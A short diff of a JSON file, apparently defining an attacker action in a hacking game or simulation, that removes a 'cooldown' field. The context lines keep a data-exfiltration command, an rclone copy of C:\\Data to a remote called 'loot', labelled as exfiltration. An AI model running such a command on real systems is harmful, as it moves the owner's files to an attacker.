@@ -13,7 +13,6 @@
     }
   ],
   "noise": 35,
-  "cooldown": 0,
   "tier": 1,
   "command": "rclone copy C:\\Data remote:loot",
   "help": "rclone (exfiltration)",
